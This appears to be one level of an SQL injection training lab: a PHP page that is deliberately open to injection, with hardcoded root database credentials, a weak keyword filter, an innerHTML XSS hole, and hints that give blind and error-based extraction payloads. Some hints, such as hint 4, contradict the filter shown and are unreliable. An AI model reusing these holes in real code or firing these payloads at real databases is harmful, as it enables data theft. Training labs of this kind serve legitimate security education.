<?php
$mysqli = new mysqli('db','root','rootpassword','sqli_lab');
$id = $_GET['id'] ?? '';

if ($id !== '') {

    $blocked_keywords = ['union', 'select', 'or', 'and', 'where', 'from'];
    $id_clean = preg_replace('/\/\*.*?\*\//', '', $id); 
    $id_lower = strtolower($id_clean);

    $blocked = false;
    foreach ($blocked_keywords as $keyword) {
        if (strpos($id_lower, $keyword) !== false) {
            $blocked = true;
            break;
        }
    }

    if (!$blocked) {
        $sql = "SELECT username FROM users WHERE id = $id";
        $result = $mysqli->query($sql);

        if (!$result) {
            die('Error: '.$mysqli->error);
        }

        $row = $result->fetch_row();
        if ($row) {
            echo htmlspecialchars($row[0]);
        } else {
            echo 'No user found';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 14 - Comment-based Bypass</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💬 Level 14 - Comment-based Bypass</h1>
            <p><strong>Attack Type:</strong> Use SQL comments to break up blocked keywords and bypass filters</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE id = <?php echo htmlspecialchars($_GET['id'] ?? 'NULL'); ?></div>
            
            <h3>🚨 Filter Rules:</h3>
            <div class="waf-warning">
                <strong>Blocked keywords:</strong> union, select, or, and, where, from<br>
                <strong>Filter removes:</strong> /* */ comments before checking
            </div>
            
            <?php
            if (isset($_GET['id']) && $_GET['id'] !== '') {
                $id = $_GET['id'];
                
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                
                // Show the filtering process
                $id_clean = preg_replace('/\/\*.*?\*\//', '', $id);
                echo '<p><strong>After comment removal:</strong> ' . htmlspecialchars($id_clean) . '</p>';
                
                $blocked_keywords = ['union', 'select', 'or', 'and', 'where', 'from'];
                $id_lower = strtolower($id_clean);

                $blocked = false;
                $blocked_keyword = '';
                foreach ($blocked_keywords as $keyword) {
                    if (strpos($id_lower, $keyword) !== false) {
                        $blocked = true;
                        $blocked_keyword = $keyword;
                        break;
                    }
                }

                if ($blocked) {
                    echo '<div class="error">🚨 Filter blocked: Keyword detected: ' . $blocked_keyword . '</div>';
                } else {
                    $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                    $sql = "SELECT username FROM users WHERE id = $id";
                    $result = $mysqli->query($sql);

                    if (!$result) {
                        echo '<div class="error">Error: '.$mysqli->error.'</div>';
                    } else {
                        $row = $result->fetch_row();
                        if ($row) {
                            echo '<strong>Username:</strong> ' . htmlspecialchars($row[0]);
                        } else {
                            echo 'No user found';
                        }
                    }
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Own Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="id">ID Parameter:</label>
                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Comment Bypass</h4>
                    <p>The filter removes /* */ comments before checking for keywords.</p>
                    <p>Try: <code>1 un/**/ion</code> - This should bypass the union filter.</p>
                    <p>The comment gets removed, leaving 'union' which then gets blocked.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Breaking Keywords with Comments</h4>
                    <p>Insert comments in the middle of keywords to bypass detection.</p>
                    <p>Try: <code>1 UN/*comment*/ION SELECT</code></p>
                    <p>After comment removal: 'UNION SELECT' - still blocked!</p>
                    <p>We need to be more creative.</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Using Alternative Syntax</h4>
                    <p>Since basic comment bypass doesn't work, try other techniques.</p>
                    <p>Try: <code>1||(ASCII(SUBSTRING((DATABASE()),1,1))>100)</code></p>
                    <p>Use functions and operators that aren't blocked.</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Nested Comments Strategy</h4>
                    <p>The regex only removes simple comments, try nested approaches.</p>
                    <p>Try: <code>-1/**/UNI/**/ON/**/SEL/**/ECT/**/(flag)/**/FR/**/OM/**/levels/**/WHE/**/RE/**/id=14</code></p>
                    <p>This breaks every keyword with comments.</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload</h4>
                    <p>Use function calls to extract data without blocked keywords:</p>
                    <p><code>1||(EXTRACTVALUE(1,CONCAT(0x7e,(MID((MID((DATABASE()),1,100)),1,50)),0x7e)))</code></p>
                    <p>Alternative with error-based extraction:</p>
                    <p><code>1||(UPDATEXML(1,CONCAT(0x7e,(MID((MID((DATABASE()),1,100)),1,50)),0x7e),1))</code></p>
                    <p>These bypass keyword filters using function names.</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level13.php">⬅️ Previous Level</a>
            <a href="level15.php">➡️ Next Level</a>
            <a href="submit.php?level=14">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('id').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + (input || 'NULL');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>
</body>
</html>
